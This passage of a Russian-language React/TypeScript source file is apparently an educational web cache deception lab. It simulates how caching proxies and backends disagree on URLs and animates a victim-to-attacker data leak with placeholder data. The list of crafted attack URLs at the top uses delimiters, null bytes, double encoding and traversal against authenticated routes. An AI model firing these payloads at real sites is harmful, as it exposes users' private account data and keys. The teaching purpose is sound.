  { url: '/dashboard%0a.png?cb=123', label: '%0a + .png + cache-bust', category: 'advanced', delimiter: '%0a', extension: 'png', route: '/dashboard', description: 'Перевод строки + .png + cache-busting параметр. Query влияет на ключ кэша.', severity: 'critical' },
  { url: '/settings%0d.css;x=1', label: '%0d + .css + matrix', category: 'advanced', delimiter: '%0d', extension: 'css', route: '/settings', description: 'Возврат каретки + .css + matrix-параметр. Spring проигнорирует ;x=1.', severity: 'critical' },
  { url: '/account/home%0f.css/../../', label: '%0f + path traversal', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Разделитель + path traversal. Глубокое искажение пути для обхода всех фильтров.', severity: 'critical' },
  { url: '/api/user%250f.css%00', label: '2x кодир. + null', category: 'advanced', delimiter: '%250f', extension: 'css', route: '/api/user', description: 'Двойное кодирование + null-байт. Тройное искажение: двойной decode + обрезка по null.', severity: 'high' },
  { url: '/profile%0f.css?X-Cache=hit', label: '%0f + cache key poison', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/profile', description: 'Разделитель + попытка отравления ключа кэша через заголовок в query.', severity: 'critical' },
  { url: '/dashboard;.js?_=.css', label: '; + query с .css', category: 'advanced', delimiter: ';', extension: 'js', route: '/dashboard', description: 'Matrix-параметр + .js + query с .css. Конкурирующие расширения в URL.', severity: 'high' },
  { url: '/account/home%0f.css?_nocache=1', label: '%0f + nocache bypass', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Разделитель + попытка обхода кэша. Параметр _nocache может быть проигнорирован прокси.', severity: 'critical' },
  { url: '/settings%0f.css?utm_source=x', label: '%0f + tracking param', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/settings', description: 'Разделитель + UTM-параметр. Tracking-параметры могут создавать уникальные ключи кэша.', severity: 'critical' },
  { url: '/api/user%00.js?callback=cb', label: '%00 + JSONP callback', category: 'advanced', delimiter: '%00', extension: 'js', route: '/api/user', description: 'Null-байт + JSONP-стиль callback. Ответ может быть обёрнут в функцию и закэширован.', severity: 'critical' },
]

/* ─────────────────────── parser ─────────────────────── */

function parseUrlWithConfigs(
  url: string,
  proxyConfig: ProxyConfig,
  backendConfig: BackendConfig
): ParsedResult {
  const original = url.trim()
  const decoded = decodeURIComponent(original)

  // ── Cache interpretation ──
  const rawExtension = original.match(/\.([a-zA-Z0-9]+)(?:\?|#|$)/)?.[1] || ''
  const cachePath = original
  const cacheIsStatic = rawExtension !== '' && proxyConfig.cacheStaticExts.includes(rawExtension)

  let cacheInterpretation: string
  let cacheDecision: string
  let cacheHeaders: string

  if (cacheIsStatic) {
    cacheInterpretation = `URL оканчивается на .${rawExtension} — распознано как статический ресурс`
    cacheDecision = `CACHE: Сохранить ответ. Ключ: "${proxyConfig.cacheKey}". TTL: ${proxyConfig.defaultTtl}s`
    cacheHeaders = `X-Cache: MISS\nCache-Control: public, max-age=${proxyConfig.defaultTtl}\nContent-Type: text/${rawExtension === 'css' ? 'css' : rawExtension === 'js' ? 'javascript' : 'plain'}`
  } else {
    cacheInterpretation = 'URL не содержит статического расширения — динамический ресурс'
    cacheDecision = 'BYPASS: Не кэшировать, проксировать запрос к серверу-источнику'
    cacheHeaders = 'X-Cache: BYPASS\nCache-Control: no-store'
  }

  // ── Backend interpretation ──
  let backendPath = decoded
  let activeDelimiter: string | null = null

  // Find which delimiter is used
  const delimiterMap: Record<string, string> = {
    '%0f': '\x0f',
    '%0a': '\n',
    '%0d': '\r',
    '%00': '\0',
    ';': ';',
    '%1f': '\x1f',
    '%0b': '\x0b',
    '%0c': '\x0c',
    '%09': '\t',
    '%23': '#',
    '%3f': '?',
    '%20': ' ',
    '%5c': '\\',
  }

  // Double-encoded delimiter map: the key is the double-encoded form,
  // the value is the single-encoded inner delimiter (used for backend recognition check)
  const doubleEncodedMap: Record<string, string> = {
    '%250f': '%0f',
    '%2500': '%00',
    '%250a': '%0a',
    '%250d': '%0d',
    '%252f': '%2f',
    '%252e': '%2e',
  }

  for (const [encoded, char] of Object.entries(delimiterMap)) {
    if (original.toLowerCase().includes(encoded.toLowerCase()) || decoded.includes(char)) {
      activeDelimiter = encoded
      break
    }
  }

  // Check for double-encoded delimiters if no single-encoded delimiter found
  let isDoubleEncoded = false
  if (!activeDelimiter) {
    for (const [doubleEncoded, singleEncoded] of Object.entries(doubleEncodedMap)) {
      if (original.toLowerCase().includes(doubleEncoded.toLowerCase())) {
        activeDelimiter = doubleEncoded
        isDoubleEncoded = true
        // For double-encoded, after first decode we get the single-encoded form
        // The backend would need to decode again to recognize the delimiter
        break
      }
    }
  }

  if (activeDelimiter && backendConfig.ignoreAfterDelimiter) {
    if (isDoubleEncoded) {
      // For double-encoded delimiters, the first decode gives the single-encoded form
      // which acts as the split point
      const innerDelim = doubleEncodedMap[activeDelimiter]
      if (innerDelim) {
        backendPath = decoded.split(innerDelim)[0]
      }
    } else {
      const delimChar = delimiterMap[activeDelimiter]
      if (delimChar === ';') {
        backendPath = decoded.split(';')[0]
      } else {
        backendPath = decoded.split(delimChar)[0]
      }
    }
  }

  // Check if backend recognizes this delimiter
  let backendRecognizesDelimiter =
    activeDelimiter !== null && backendConfig.stripDelimiters.includes(activeDelimiter.toLowerCase())

  // For double-encoded delimiters, check if the inner single-encoded delimiter is recognized
  if (isDoubleEncoded && activeDelimiter && !backendRecognizesDelimiter) {
    const innerDelim = doubleEncodedMap[activeDelimiter]
    if (innerDelim) {
      backendRecognizesDelimiter = backendConfig.stripDelimiters.includes(innerDelim.toLowerCase())
    }
  }

  const backendIsStatic = false
  const routeMap: Record<string, string> = {
    '/account/home': 'app.get("/account/home", authMiddleware, handler)',
    '/api/user': 'app.get("/api/user", authMiddleware, handler)',
    '/profile': 'app.get("/profile", authMiddleware, handler)',
    '/dashboard': 'app.get("/dashboard", authMiddleware, handler)',
    '/settings': 'app.get("/settings", authMiddleware, handler)',
  }
  const routeMatch = routeMap[backendPath] || `route("${backendPath}") — 404 если маршрут не найден`

  const responsePreview = routeMap[backendPath]
    ? `HTTP 200 OK\nContent-Type: application/json\n\n{ "username": "victim@email.com", "api_key": "sk_live_...", "balance": "$1,250" }`
    : `HTTP 404 Not Found\n\n{ "error": "Route not found" }`

  let backendInterpretation: string
  if (isDoubleEncoded && activeDelimiter && backendRecognizesDelimiter) {
    backendInterpretation = `Двойное кодирование ${activeDelimiter}. После первого decode: ${doubleEncodedMap[activeDelimiter]}. После второго decode — разделитель распознан. Путь обрезан до "${backendPath}".`
  } else if (isDoubleEncoded && activeDelimiter && !backendRecognizesDelimiter) {
    backendInterpretation = `Двойное кодирование ${activeDelimiter}. Внутренний разделитель ${doubleEncodedMap[activeDelimiter]} НЕ распознан backend (${backendConfig.type}). Полный путь: "${decoded}".`
  } else if (activeDelimiter && backendRecognizesDelimiter) {
    backendInterpretation = `Разделитель ${activeDelimiter} распознан. Путь обрезан до "${backendPath}". Расширение .${rawExtension} проигнорировано.`
  } else if (activeDelimiter && !backendRecognizesDelimiter) {
    backendInterpretation = `Разделитель ${activeDelimiter} НЕ распознан данным backend (${backendConfig.type}). Полный путь: "${decoded}".`
  } else {
    backendInterpretation = `Стандартный URL без разделителей. Путь: "${decoded}".`
  }

  // ── Vulnerability check ──
  const isVulnerable =
    cacheIsStatic &&
    activeDelimiter !== null &&
    backendRecognizesDelimiter &&
    backendPath !== original &&
    !!routeMap[backendPath] &&
    !original.includes('?')

  const vulnerabilityType = isVulnerable
    ? `Delimiter Discrepancy (${activeDelimiter}): Cache видит .${rawExtension}, Backend видит ${backendPath}`
    : null

  return {
    original,
    cache: {
      path: cachePath,
      extension: rawExtension,
      isStatic: cacheIsStatic,
      interpretation: cacheInterpretation,
      cacheDecision,
      cacheHeaders,
    },
    backend: {
      path: backendPath,
      extension: null,
      isStatic: backendIsStatic,
      interpretation: backendInterpretation,
      routeMatch,
      responsePreview,
    },
    isVulnerable,
    vulnerabilityType,
    delimiterUsed: activeDelimiter,
  }
}

/* ─────────────────────── sub-components ─────────────────────── */

function CodeBlock({ code, title, icon }: { code: string; title: string; icon: React.ReactNode }) {
  const [copied, setCopied] = useState(false)

  const handleCopy = () => {
    navigator.clipboard.writeText(code)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  // Parse code lines to highlight comments
  const renderCode = () => {
    const lines = code.split('\n')
    return lines.map((line, i) => {
      const trimmed = line.trimStart()
      // Comment patterns: # ..., // ..., /* ... */, <!-- ... -->
      const isComment = /^(#|\/\/|\/\*|\*|<!--)/.test(trimmed) ||
                        trimmed.startsWith('* ') ||
                        trimmed.startsWith('═') ||
                        trimmed.startsWith('──')
      // Inline comment after code: e.g. `cache: true  # comment`
      const inlineCommentMatch = line.match(/^(.*?)(\s+(#|\/\/)\s+.*)$/)

      if (isComment) {
        return (
          <div key={i} className="comment-line">
            {line}
            {'\n'}
          </div>
        )
      }

      if (inlineCommentMatch && inlineCommentMatch[2]) {
        return (
          <div key={i}>
            <span className="code-content">{inlineCommentMatch[1]}</span>
            <span className="comment-line">{inlineCommentMatch[2]}</span>
            {'\n'}
          </div>
        )
      }

      return (
        <div key={i}>
          {line}
          {'\n'}
        </div>
      )
    })
  }

  return (
    <Card className="border-border overflow-hidden">
      <CardHeader className="p-3 sm:p-4 pb-2">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            {icon}
            <CardTitle className="text-xs sm:text-sm font-semibold">{title}</CardTitle>
          </div>
          <Button variant="ghost" size="sm" onClick={handleCopy} className="h-7 text-xs">
            <Copy className="h-3 w-3 mr-1" />
            {copied ? 'Скопировано' : 'Копировать'}
          </Button>
        </div>
      </CardHeader>
      <CardContent className="px-0 pb-0">
        <pre className="px-3 sm:px-4 pb-3 sm:pb-4 text-[10px] sm:text-xs font-mono text-muted-foreground overflow-x-auto leading-relaxed whitespace-pre">
          <code>{renderCode()}</code>
        </pre>
      </CardContent>
    </Card>
  )
}

function TerminalOutput({ lines }: { lines: TerminalLine[] }) {
  const terminalRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [lines])

  const getLineColor = (type: TerminalLine['type']) => {
    switch (type) {
      case 'request': return 'text-cyan-400'
      case 'response': return 'text-emerald-400'
      case 'cache': return 'text-amber-400'
      case 'backend': return 'text-blue-400'
      case 'error': return 'text-red-400'
      case 'success': return 'text-emerald-400'
      case 'warn': return 'text-yellow-400'
      default: return 'text-muted-foreground'
    }
  }

  const getLinePrefix = (type: TerminalLine['type']) => {
    switch (type) {
      case 'request': return '→'
      case 'response': return '←'
      case 'cache': return '[CACHE]'
      case 'backend': return '[BACKEND]'
      case 'error': return '✗'
      case 'success': return '✓'
      case 'warn': return '⚠'
      default: return '●'
    }
  }

  return (
    <div
      ref={terminalRef}
      className="bg-[oklch(0.12_0.01_165)] rounded-lg border border-border p-3 sm:p-4 h-64 sm:h-80 overflow-y-auto font-mono text-[10px] sm:text-xs leading-relaxed"
    >
      {lines.length === 0 ? (
        <div className="text-muted-foreground/50 flex items-center justify-center h-full">
          <div className="text-center">
            <Terminal className="h-8 w-8 mx-auto mb-2 opacity-30" />
            <p>Терминал готов. Запустите симуляцию или введите команду в песочнице.</p>
          </div>
        </div>
      ) : (
        lines.map((line, i) => (
          <div key={i} className={`${getLineColor(line.type)} animate-in fade-in duration-300`}>
            <span className="text-muted-foreground/50 mr-2">{getLinePrefix(line.type)}</span>
            {line.text}
          </div>
        ))
      )}
    </div>
  )
}

function FlowDiagram({ result, step }: { result: ParsedResult; step: number }) {
  return (
    <div className="space-y-2 sm:space-y-3">
      {/* User / Attacker */}
      <div className={`flex items-center gap-2.5 p-2.5 sm:p-3 rounded-lg border transition-all duration-500 ${
        step >= 1 ? 'border-cyan-500/30 bg-cyan-500/5' : 'border-border bg-card'
      }`}>
        <div className="flex h-8 w-8 items-center justify-center rounded-full bg-cyan-500/20 shrink-0">
          <Globe className="h-4 w-4 text-cyan-400" />
        </div>
        <div className="flex-1 min-w-0">
          <p className="text-xs sm:text-sm font-medium text-foreground">Клиент</p>
          <code className="text-[10px] sm:text-xs text-cyan-400 break-all">
            GET {result.original}
          </code>
        </div>
        {step >= 1 && (
          <Badge className="text-[10px] bg-cyan-500/10 text-cyan-400 border-cyan-500/20">Запрос отправлен</Badge>
        )}
      </div>

      {/* Arrow */}
      {step >= 2 && (
        <div className="flex justify-center animate-in fade-in duration-300">
          <ArrowDown className="h-4 w-4 text-muted-foreground" />
        </div>
      )}

      {/* Proxy / Cache */}
      <div className={`flex items-center gap-2.5 p-2.5 sm:p-3 rounded-lg border transition-all duration-500 ${
        step >= 2
          ? result.cache.isStatic
            ? 'border-amber-500/30 bg-amber-500/5'
            : 'border-emerald-500/30 bg-emerald-500/5'
          : 'border-border bg-card'
      }`}>
        <div className={`flex h-8 w-8 items-center justify-center rounded-full shrink-0 ${
          result.cache.isStatic ? 'bg-amber-500/20' : 'bg-emerald-500/20'
        }`}>
          <Database className={`h-4 w-4 ${result.cache.isStatic ? 'text-amber-400' : 'text-emerald-400'}`} />
        </div>
        <div className="flex-1 min-w-0">
          <p className="text-xs sm:text-sm font-medium text-foreground">
            Прокси-сервер (Cache)
          </p>
          <p className="text-[10px] sm:text-xs text-muted-foreground">
            Видит: <code className={result.cache.isStatic ? 'text-amber-400' : 'text-emerald-400'}>
              {result.cache.path}
            </code>
          </p>
        </div>
        {step >= 2 && (
          <Badge className={`text-[10px] ${
            result.cache.isStatic
              ? 'bg-amber-500/10 text-amber-400 border-amber-500/20'
              : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
          }`}>
            {result.cache.isStatic ? `Кэшировать (.${result.cache.extension})` : 'BYPASS'}
          </Badge>
        )}
      </div>

      {/* Arrow */}
      {step >= 3 && (
        <div className="flex justify-center animate-in fade-in duration-300">
          <ArrowDown className="h-4 w-4 text-muted-foreground" />
        </div>
      )}

      {/* Backend */}
      <div className={`flex items-center gap-2.5 p-2.5 sm:p-3 rounded-lg border transition-all duration-500 ${
        step >= 3
          ? result.isVulnerable
            ? 'border-red-500/30 bg-red-500/5'
            : 'border-emerald-500/30 bg-emerald-500/5'
          : 'border-border bg-card'
      }`}>
        <div className={`flex h-8 w-8 items-center justify-center rounded-full shrink-0 ${
          result.isVulnerable ? 'bg-red-500/20' : 'bg-emerald-500/20'
        }`}>
          <Server className={`h-4 w-4 ${result.isVulnerable ? 'text-red-400' : 'text-emerald-400'}`} />
        </div>
        <div className="flex-1 min-w-0">
          <p className="text-xs sm:text-sm font-medium text-foreground">
            Сервер-источник (Backend)
          </p>
          <p className="text-[10px] sm:text-xs text-muted-foreground">
            Видит: <code className={result.isVulnerable ? 'text-red-400' : 'text-emerald-400'}>
              {result.backend.path}
            </code>
          </p>
        </div>
        {step >= 3 && (
          <Badge className={`text-[10px] ${
            result.isVulnerable
              ? 'bg-red-500/10 text-red-400 border-red-500/20'
              : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
          }`}>
            {result.isVulnerable ? 'Данные пользователя' : 'Динамический ответ'}
          </Badge>
        )}
      </div>

      {/* Discrepancy & Cache store */}
      {step >= 4 && result.isVulnerable && (
        <>
          <div className="flex justify-center animate-in fade-in duration-300">
            <ArrowDown className="h-4 w-4 text-red-400" />
          </div>
          <div className="flex items-center gap-2.5 p-2.5 sm:p-3 rounded-lg border border-amber-500/30 bg-gradient-to-r from-amber-500/5 to-red-500/5 animate-in fade-in duration-500">
            <div className="flex h-8 w-8 items-center justify-center rounded-full bg-amber-500/20 shrink-0">
              <Copy className="h-4 w-4 text-amber-400" />
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-xs sm:text-sm font-medium text-amber-400">
                Кэш сохраняет ответ как .{result.cache.extension}
              </p>
              <p className="text-[10px] sm:text-xs text-muted-foreground">
                Данные жертвы кэшированы. Ключ: {result.original}. TTL: 3600s
              </p>
            </div>
            <Badge className="text-[10px] bg-amber-500/10 text-amber-400 border-amber-500/20">CACHED</Badge>
          </div>
        </>
      )}

      {/* Attacker retrieves */}
      {step >= 5 && result.isVulnerable && (
        <>
          <div className="flex justify-center animate-in fade-in duration-300">
            <ArrowDown className="h-4 w-4 text-red-400" />
          </div>
          <div className="flex items-center gap-2.5 p-2.5 sm:p-3 rounded-lg border border-red-500/30 bg-red-500/10 animate-in fade-in duration-500">
            <div className="flex h-8 w-8 items-center justify-center rounded-full bg-red-500/20 shrink-0">
              <AlertTriangle className="h-4 w-4 text-red-400" />
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-xs sm:text-sm font-medium text-red-400">
                Атакующий получает данные жертвы из кэша!
              </p>
              <code className="text-[10px] text-red-300 break-all">
                {"{ username: 'victim@email.com', api_key: 'sk_live_...', balance: '$1,250' }"}
              </code>
            </div>
            <Badge className="text-[10px] bg-red-500/10 text-red-400 border-red-500/20">УТЕЧКА</Badge>
          </div>
        </>
      )}
    </div>
  )
}

/* ─────────────────────── main component ─────────────────────── */

export function LabView() {
  // Config state
  const [proxyType, setProxyType] = useState<string>('cloudflare')
  const [backendType, setBackendType] = useState<string>('nodejs')

  // Simulation state
  const [urlInput, setUrlInput] = useState('/account/home%0f.css')
  const [currentStep, setCurrentStep] = useState(0)
  const [result, setResult] = useState<ParsedResult | null>(null)
  const [isAnimating, setIsAnimating] = useState(false)
  const [terminalLines, setTerminalLines] = useState<TerminalLine[]>([])

  // Sandbox state
  const [sandboxUrl, setSandboxUrl] = useState('')
  const [sandboxRole, setSandboxRole] = useState<'victim' | 'attacker'>('victim')
  const [sandboxPhase, setSandboxPhase] = useState<'idle' | 'victim-request' | 'cache-store' | 'attacker-request' | 'data-leak'>('idle')
  const [sandboxTerminalLines, setSandboxTerminalLines] = useState<TerminalLine[]>([])
  const [sandboxCacheEntries, setSandboxCacheEntries] = useState<Map<string, { data: string; ttl: number }>>(new Map())

  // Experiments state
  const [activeTab, setActiveTab] = useState('config')
  const [selectedCategory, setSelectedCategory] = useState<string>('all')
  const [selectedVariant, setSelectedVariant] = useState<AttackVariant | null>(null)
  const [batchResults, setBatchResults] = useState<Record<string, boolean> | null>(null)
  const [isBatchRunning, setIsBatchRunning] = useState(false)
  const [builderRoute, setBuilderRoute] = useState('/account/home')
  const [builderDelimiter, setBuilderDelimiter] = useState('')
  const [builderExtension, setBuilderExtension] = useState('')

  const proxyConfig = PROXY_CONFIGS[proxyType]
  const backendConfig = BACKEND_CONFIGS[backendType]

  // ── Simulation ──
  const addTerminalLine = useCallback((line: TerminalLine) => {
    setTerminalLines(prev => [...prev, line])
  }, [])

  const runSimulation = useCallback(() => {
    const parsed = parseUrlWithConfigs(urlInput, proxyConfig, backendConfig)
    setResult(parsed)
    setCurrentStep(0)
    setIsAnimating(true)
    setTerminalLines([])

    const steps = [
      { step: 1, lines: [
        { type: 'info' as const, text: `═══ Симуляция WCD-атаки ═══` },
        { type: 'request' as const, text: `GET ${parsed.original} HTTP/1.1` },
        { type: 'request' as const, text: `Host: example.com` },
        { type: 'request' as const, text: `Cookie: session=victim_session_token` },
      ]},
      { step: 2, lines: [
        { type: 'cache' as const, text: `Прокси (${proxyConfig.type}) анализирует URL...` },
        { type: 'cache' as const, text: `Путь: ${parsed.cache.path}` },
        { type: 'cache' as const, text: `Расширение: ${parsed.cache.extension || 'нет'}` },
        { type: 'cache' as const, text: parsed.cache.cacheDecision },
      ]},
      { step: 3, lines: [
        { type: 'backend' as const, text: `Backend (${backendConfig.type}) обрабатывает запрос...` },
        { type: 'backend' as const, text: `Декодированный путь: ${parsed.backend.path}` },
        { type: 'backend' as const, text: parsed.backend.interpretation },
        { type: 'backend' as const, text: `Маршрут: ${parsed.backend.routeMatch}` },
      ]},
      { step: 4, lines: parsed.isVulnerable ? [
        { type: 'warn' as const, text: `⚠ РАСХОЖДЕНИЕ ОБНАРУЖЕНО!` },
        { type: 'cache' as const, text: `Cache: видит .${parsed.cache.extension} → кэширует ответ` },
        { type: 'backend' as const, text: `Backend: видит ${parsed.backend.path} → возвращает данные пользователя` },
        { type: 'response' as const, text: `HTTP 200 OK` },
        { type: 'cache' as const, text: parsed.cache.cacheHeaders },
        { type: 'error' as const, text: `ОТВЕТ СОХРАНЁН В КЭШЕ! Ключ: ${parsed.original}` },
      ] : [
        { type: 'success' as const, text: `Расхождения нет. URL обработан одинаково.` },
      ]},
      { step: 5, lines: parsed.isVulnerable ? [
        { type: 'error' as const, text: `Атакующий запрашивает: GET ${parsed.original}` },
        { type: 'cache' as const, text: `X-Cache: HIT (ответ из кэша)` },
        { type: 'error' as const, text: `Данные жертвы утекли без аутентификации!` },
        { type: 'response' as const, text: parsed.backend.responsePreview },
      ] : [
        { type: 'success' as const, text: `Уязвимость не обнаружена. Попробуйте другой URL.` },
      ]},
    ]

    let totalDelay = 0
    steps.forEach(({ step, lines }) => {
      lines.forEach((line, i) => {
        totalDelay += 300
        setTimeout(() => {
          addTerminalLine(line)
        }, totalDelay)
      })
      setTimeout(() => {
        setCurrentStep(step)
      }, totalDelay - 100)
    })

    totalDelay += 500
    setTimeout(() => setIsAnimating(false), totalDelay)
  }, [urlInput, proxyConfig, backendConfig, addTerminalLine])

  const reset = () => {
    setCurrentStep(0)
    setResult(null)
    setIsAnimating(false)
    setTerminalLines([])
  }

  // ── Sandbox ──
  const runSandboxAttack = useCallback(() => {
    if (!sandboxUrl.trim()) return

    setSandboxTerminalLines([])
    setSandboxPhase('idle')

    const parsed = parseUrlWithConfigs(sandboxUrl, proxyConfig, backendConfig)

    if (!parsed.isVulnerable) {
      setSandboxTerminalLines([
        { type: 'info', text: `Анализ URL: ${sandboxUrl}` },
        { type: 'warn', text: `Этот URL не вызывает расхождения между кэшем и сервером.` },
        { type: 'info', text: `Попробуйте URL с разделителем, например: /account/home%0f.css` },
      ])
      return
    }

    // Phase 1: Victim request
    setSandboxPhase('victim-request')
    setSandboxTerminalLines(prev => [
      ...prev,
      { type: 'info', text: `═══ Фаза 1: Жертва переходит по ссылке ═══` },
      { type: 'request', text: `[VICTIM] GET ${parsed.original} HTTP/1.1` },
      { type: 'request', text: `[VICTIM] Cookie: session=victim_session_token` },
      { type: 'cache', text: `[CACHE] Прокси (${proxyConfig.type}): расширение .${parsed.cache.extension} → кэшировать` },
    ])

    setTimeout(() => {
      setSandboxTerminalLines(prev => [
        ...prev,
        { type: 'backend', text: `[BACKEND] ${backendConfig.type}: маршрут → ${parsed.backend.path}` },
        { type: 'response', text: `[BACKEND] 200 OK — данные пользователя жертвы` },
      ])
    }, 1500)

    // Phase 2: Cache stores
    setTimeout(() => {
      setSandboxPhase('cache-store')
      setSandboxTerminalLines(prev => [
        ...prev,
        { type: 'warn', text: `═══ Фаза 2: Кэш сохраняет ответ ═══` },
        { type: 'cache', text: `[CACHE] Сохранено: ключ="${parsed.original}", TTL=${proxyConfig.defaultTtl}s` },
        { type: 'cache', text: `[CACHE] Cache-Control: public, max-age=${proxyConfig.defaultTtl}` },
      ])
      setSandboxCacheEntries(prev => new Map(prev).set(parsed.original, {
        data: `{"username":"victim@email.com","api_key":"sk_live_..."}`,
        ttl: proxyConfig.defaultTtl,
      }))
    }, 3000)

    // Phase 3: Attacker request
    setTimeout(() => {
      setSandboxPhase('attacker-request')
      setSandboxRole('attacker')
      setSandboxTerminalLines(prev => [
        ...prev,
        { type: 'info', text: `═══ Фаза 3: Атакующий запрашивает тот же URL ═══` },
        { type: 'request', text: `[ATTACKER] GET ${parsed.original} HTTP/1.1` },
        { type: 'request', text: `[ATTACKER] Cookie: <нет аутентификации>` },
      ])
    }, 5000)

    // Phase 4: Data leak
    setTimeout(() => {
      setSandboxPhase('data-leak')
      setSandboxTerminalLines(prev => [
        ...prev,
        { type: 'cache', text: `[CACHE] X-Cache: HIT — ответ из кэша!` },
        { type: 'error', text: `[LEAK] Данные жертвы выданы без аутентификации!` },
        { type: 'response', text: parsed.backend.responsePreview },
        { type: 'error', text: `═══ АТАКА УСПЕШНА! Конфиденциальные данные скомпрометированы. ═══` },
      ])
    }, 7000)
  }, [sandboxUrl, proxyConfig, backendConfig])

  const resetSandbox = () => {
    setSandboxPhase('idle')
    setSandboxRole('victim')
    setSandboxTerminalLines([])
    setSandboxCacheEntries(new Map())
  }

  // ── Experiments helpers ──
  const filteredVariants = ATTACK_VARIANTS.filter(v =>
    selectedCategory === 'all' ? true : v.category === selectedCategory
  )

  const categoryCounts = ATTACK_VARIANTS.reduce<Record<string, number>>((acc, v) => {
    acc[v.category] = (acc[v.category] || 0) + 1
    return acc
  }, {})

  const buildCustomUrl = useCallback(() => {
    return `${builderRoute}${builderDelimiter}${builderExtension ? '.' + builderExtension : ''}`
  }, [builderRoute, builderDelimiter, builderExtension])

  const runBatchTest = useCallback(() => {
    setIsBatchRunning(true)
    setBatchResults(null)
    const results: Record<string, boolean> = {}
    const variantsToTest = selectedCategory === 'all'
      ? ATTACK_VARIANTS
      : ATTACK_VARIANTS.filter(v => v.category === selectedCategory)

    let idx = 0
    const testNext = () => {
      if (idx >= variantsToTest.length) {
        setIsBatchRunning(false)
        return
      }
      const variant = variantsToTest[idx]
      const parsed = parseUrlWithConfigs(variant.url, proxyConfig, backendConfig)
      results[variant.url] = parsed.isVulnerable
      setBatchResults({ ...results })
      idx++
      setTimeout(testNext, 30)
    }
    testNext()
  }, [selectedCategory, proxyConfig, backendConfig])

  const vulnerabilityMatrix = useMemo(() => {
    const matrixDelimiters = ['%0f', '%0a', '%0d', '%00', ';', '%1f', '%0b', '%0c', '%09']
    const matrixExtensions = ['css', 'js', 'png', 'jpg', 'gif', 'svg', 'ico', 'woff', 'woff2']
    const baseRoute = '/account/home'

    const data: Record<string, Record<string, boolean>> = {}
    for (const delim of matrixDelimiters) {
      data[delim] = {}
      for (const ext of matrixExtensions) {
        const url = `${baseRoute}${delim}.${ext}`
        const parsed = parseUrlWithConfigs(url, proxyConfig, backendConfig)
        data[delim][ext] = parsed.isVulnerable
      }
    }

    return { delimiters: matrixDelimiters, extensions: matrixExtensions, data }
  }, [proxyConfig, backendConfig])

  return (
    <div className="max-w-6xl mx-auto px-3 sm:px-4 lg:px-6 py-6 sm:py-8">
      {/* Header */}
      <div className="flex items-center gap-2.5 sm:gap-3 mb-5 sm:mb-6">
        <div className="flex h-9 w-9 sm:h-10 sm:w-10 items-center justify-center rounded-lg bg-gradient-to-br from-emerald-500 to-cyan-500 text-white">
          <FlaskConical className="h-4.5 w-4.5 sm:h-5 sm:w-5" />
        </div>
        <div>
          <h1 className="text-xl sm:text-2xl font-bold text-foreground">Лаборатория WCD</h1>
          <p className="text-xs sm:text-sm text-muted-foreground">Конфигурация, симуляция и интерактивная песочница</p>
        </div>
      </div>

      {/* Main Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-4 sm:space-y-5">
        <TabsList className="w-full grid grid-cols-4 h-9 sm:h-10">
          <TabsTrigger value="config" className="text-xs sm:text-sm gap-1 sm:gap-1.5">
            <Settings className="h-3.5 w-3.5" />
            <span className="hidden sm:inline">Конфигурация</span>
            <span className="sm:hidden">Конфиг</span>
          </TabsTrigger>
          <TabsTrigger value="simulation" className="text-xs sm:text-sm gap-1 sm:gap-1.5">
            <Play className="h-3.5 w-3.5" />
            <span className="hidden sm:inline">Симуляция</span>
            <span className="sm:hidden">Сим</span>
          </TabsTrigger>
          <TabsTrigger value="sandbox" className="text-xs sm:text-sm gap-1 sm:gap-1.5">
            <Terminal className="h-3.5 w-3.5" />
            <span>Песочница</span>
          </TabsTrigger>
          <TabsTrigger value="experiments" className="text-xs sm:text-sm gap-1 sm:gap-1.5">
            <Beaker className="h-3.5 w-3.5" />
            <span className="hidden sm:inline">Эксперименты</span>
            <span className="sm:hidden">Эксп</span>
          </TabsTrigger>
        </TabsList>

        {/* ──────────── TAB 1: Configuration ──────────── */}
        <TabsContent value="config" className="space-y-4 sm:space-y-5">
          {/* Proxy selector */}
          <Card className="border-border">
            <CardHeader className="p-3 sm:p-4 pb-2">
              <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2">
                <div className="flex items-center gap-2">
                  <Database className="h-4 w-4 text-amber-400" />
                  <CardTitle className="text-sm sm:text-base font-semibold">Прокси-сервер (Cache)</CardTitle>
                </div>
                <div className="flex flex-wrap gap-1.5 sm:gap-2">
                    {(['cloudflare', 'nginx', 'varnish', 'apache', 'flyio', 'cloudflare_workers'] as const).map(type => (
                      <Button
                        key={type}
                        variant={proxyType === type ? 'default' : 'outline'}
                        size="sm"
                        onClick={() => setProxyType(type)}
                        className={`text-[10px] sm:text-xs h-7 sm:h-8 min-w-[44px] ${proxyType === type ? 'bg-amber-500/20 text-amber-400 border-amber-500/30 hover:bg-amber-500/30' : ''}`}
                      >
                        {type === 'cloudflare' ? 'Cloudflare' : type === 'nginx' ? 'Nginx' : type === 'varnish' ? 'Varnish' : type === 'apache' ? 'Apache' : type === 'flyio' ? 'Fly.io' : 'CF Workers'}
                      </Button>
                    ))}
                </div>
              </div>
            </CardHeader>
            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4 space-y-3">
              {/* Config explanation */}
              <div className="grid sm:grid-cols-2 gap-3">
                <div className="p-2.5 sm:p-3 rounded-lg bg-amber-500/5 border border-amber-500/20">
                  <p className="text-[10px] sm:text-xs font-medium text-amber-400 mb-1.5">Логика кэширования</p>
                  <ul className="text-[10px] sm:text-xs text-muted-foreground space-y-1">
                    <li>• Расширения: .{proxyConfig.cacheStaticExts.slice(0, 5).join(', .')}, ...</li>
                    <li>• Ключ кэша: <code className="text-amber-400">{proxyConfig.cacheKey}</code></li>
                    <li>• Нормализация URL: <code className={proxyConfig.normalizeUrl ? 'text-emerald-400' : 'text-red-400'}>{proxyConfig.normalizeUrl ? 'Да' : 'Нет'}</code></li>
